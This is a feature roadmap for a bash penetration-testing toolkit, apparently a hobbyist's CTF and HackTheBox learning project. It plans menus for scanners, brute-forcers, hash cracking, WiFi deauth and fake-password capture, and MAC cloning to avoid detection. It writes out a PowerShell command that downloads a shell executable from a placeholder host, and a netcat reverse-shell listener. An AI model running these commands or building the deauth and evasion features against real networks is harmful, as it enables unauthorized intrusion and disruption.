# Future Features

**This is the resource schedule, if you need something that is not on that list you have three options:**</br>
**1** - You can request the resource for me, if it is a good idea I will implement it, but at the end of the task list.</br>
**2** - If you need urgency, you can write the code and send it to me.</br>
**3** - Pay me to implement the feature. <br/>

0.0. O menu do change mac adress não esta fucnionando corretamente corrige lá
0.1. Revisa se esta funcionando certinho e altera de torghost para torghostNG. tem o comando que deve ser usado no notes
1.1 Implementa o Jhon The reaper aqui no codigo, tem a logica no notion
 2 - Muda todas as vezes que preciso solicitar uma placa de wifi para o nome que vem da função selectedwificard
 9 - Estuda e implemneta nmap
 9.1 Faz uma opção no nmap com vull script like sudo nmap -sS --script vuln -vv www.siteemquestao.com.br
 10 - Faz um menu para ganhar acesso powershell em windows usando o comando a seguinr  \psexec.py administrator@10.10.10.27\" tem um exemplo no primeior hack do hackthebox "
 10.1 - Revist the script, read the script from the top to the begining and see what can be done better
 11 - Faz um menu pra conectar no msql usando o padrao acima, sendo que o login é o começo o ip é o do servidor mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
 12 - Um menu para criar um webserver temporario usando python ---- sudo python3 -m http.server 80
 13 - Muda todas as variaveis para minuscula é uma boa pratica pois variaveis do sistema são em maiuscula
 14 - Faz um menu pra dar start no metaspoit: msfdb int .... msfconsole
 15 - Add -vv para todos os comandos nmap do script pra poder acompanhar em tempo real
 16 - Cria um menu para bruteforce e dentro do menu na hora que escolhe faz uma observação em cima como uma opçoa 0 por exempol ocrito 0 - OBS! If you need to scan a dns or vhost there is a alwsome tool called GoBuster, study.
 17 - Estuda e coloca um menu pra dar airodump que exibe as conexões, se não me engano é sudo irodump-ng wlan0 mas testa e acho que precisa colocar em modo monitor também usando o airclack ou algo assim
 18 - Implementa o Hydra, é uma exelente ferramenta de bruteforce, já tem no notes uma logica de programação
 19 - Coloca o dirsearch para rodar como sudo, pois assim consegue salvar logs normalmente, pois esta sem permissõa
 20 - tem umas opções mais completas no dirsearch como por exemplo usar uma lista de extenções, que deve ser tipo cvs, além de outras coisas, como recursivo ou nao e o nivel de recursividade, coloca no codigo, estuda melhor e planeja pra diexar o mais completo possivel
 20.1 - Revist the script, read the script from the top to the begining and see what cam be done better
 21 - subistituo onde esta test por [[ comand ]] é um jeito melhor de se fazer e o outro jetio esta obsoleto
 22 - estuda o crunch e implementa no script é um otimo programa para gerar listas de senhas para quando precisar descobrir uma senha mas já tem um padrão em mente
 24 - Sera que este é o mlehor jeit ode fazer menu possivel? Vis sobre a possibilidade de usar o comand select do bash, da uma estudada nisso, pode ser uma boa tem mais aqui https://wiki.bash-hackers.org/syntax/ccmd/user_select
 27 - Eu não sei se é possivle, mas se for que tal dar uma estudada no pyshark? e implentar aqui em um script de bash, é possivel ou so quando este script mudar pra python?
 28 - Implement patetor? it is a best tool? then Hydra? Search more.
 29 - Implement study mor about reponder.py, and add to the script a method to crack a password using jhon the reaper Faz um menu para o jhon the reaper john SMB-NTLMv2-SSP-192.168.100.101.txt –wordlist=/usr/share/wordlists/rockyou.txt porque é relacionado ao responder.py
 30 - Tem algum jetio de colocar romandos pra rodar no metasploit por aqui? seria sensacional, ai conforme eu for aprendendo eu vou adiciondo, tambem tem a questão que tira pra aprender bem e se possivel até fazer um curso de metasploit é uma ideia exelente, planeja melhor
 30.1 - Revist the script, read the script from the top to the begining and see what cam be done better
 31 - Create a function to check if a program is instaling before runnning and if not instaled then ask to install, and apply to all my tools in this script
 32 - Study and implement hashcat
 32 - Create a Function who: 1 - you imput an wifi nam 2 -  the coputer clone that mac adress from the AP to avoid detection, 3 - Show options to crack that wifi, like: Show a fake iput from password, and automated tools using weakness
34 - Replace all echos for printf, its better
35 - See how i avoid to use eval, its too bat for security
36 - Study and implement a funciontion using curl, there so much good about, like set and get cookieas, or send post, is very versatile
38 - Study and implement an script using WinPEAS.exe, maybe an bat? to automatize? and also WinPEAS.py to check for vulns in linux
39 - Study Msfvnom and implement, it is an excelent payload generator[:]
40 - Study and implent rlwrap nc -lnvp 4444 its realy good to reverse shells and study about the rlwarp ok? to understend perfectly. Maybe using pwncat?
40.1 - Revist the script, read the script from the top to the begining and see what cam be done better
41 - Create a menu with util stuff, like "powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')" this is for download archives using powrshell
42 - Put in dirsearch an option to save the output, its awsome to CTFs  and reports
43 - study the best directory wordlist, to use in dirbuster or afuzz, or another tool
44 - Study and implement wpscan, its a good tool to break into wordpress sites
45 - Cretate a menu who check if two ips are in them same network. This same menu can, calculate things like, create networks for ips, like: i need 2 networks with a minimum 200ips, or i need an netsplit a network in 3 other networks, things like this. And print a tamble explaining the result showing the binaries in colours. There some creat linux tools for this maybe only implement is suficient
46 - Study and implement rustscan, its a realy good tool. There is a github repository
47 - Sudy and inplement inplement  One-Lin3r its a realy good tool to acelerate the process of geting reverse shells, and other scripts
48 - Migrate the Script to Python, sarch for a method to run bash code inside python an migrate gradually if possible, if not, than create an second script and start the developmenti
49 - Create a Function who update the script with the last features implemented in the github version
50 - Revist the script, read the script from the top to the begining and see what cam be done better
53 - If don't exist yet, make an script to automate deauth all dispositives in an network, maybe in more than one if possible
54 - Organize the menu in a better way, is too confuse
55 - Implement a flag to disable the notification "command will running in 5 seconds, or even change the time"
56 - Study massscan, its good for mass scaning ports, or rustscan? What is better?
57 - Add an option to windows tools, like mimikatz and think if only show then or run then, i think run its better, butt tike about
58 - Study and implement msfvenom its a great tool to make palyloads
59 - Study and implement nikto
60 - Revist the script, read the script from the top to the begining and see what cam be done better
62 - Study and implement termshark, its good to see pcaps in terminal
63 - Study and implement FFUF, its really fast because its in go
64 - Implement option so search ".bak" in in websearches, it really good to see some codes
65 - Study and implement Uchecker, its a good tool to check for not uptodate tools on servers
66 - Study and implement Snort, its a preaty good to to check for viruses in network, its good for networks and home users
77 - Remove cpf generator, there is better tools online
78 -  Study and implment sublist3r, its a really great scanner for subdomains ussing ossint
79 - Study and implement pwncat, its a really great reverse shell hander, is the one by calleb stuart, not the other
80 - Revist the script, read the script from the top to the begining and see what cam be done better
81 - Study and implment nikton its a good webscaner
82 - Study and implment social engenner tookit, its really god to work with social engineer
83 - Change DirBuster by Gobuster? Search more about... Gobuster has more users, maybe its better? actualy is more faster than dirbuster, so thats is what matter
84 - Implement wfuzz its preaty great
85 - Study and Implement Sqlmap
86 - Implement te 'sectlist' program from kali, its a copy for the repository on github. Maybe a menu here or an option to use in the aplications who neded, also study what is the best wordlists for who?
87 - Study and implent enum4linux, its preaty good to use to enumerate samba shares
88 - Create an option to disable showing comands after runnning. Maybe a flag before ruing? like BRHackTools -noverbose
89 - Study and implement sherlock, its a great tool for OSINT
90 - Revist the script, read the script from the top to the begining and see what cam be done better
91 - Study and implement airgedon its good to do deauth atacks in softwarey
92 - What i can do to make this script more beautiful? Maybe some colors or ident?
93 - Maybe Implement RustScan? Its so fast
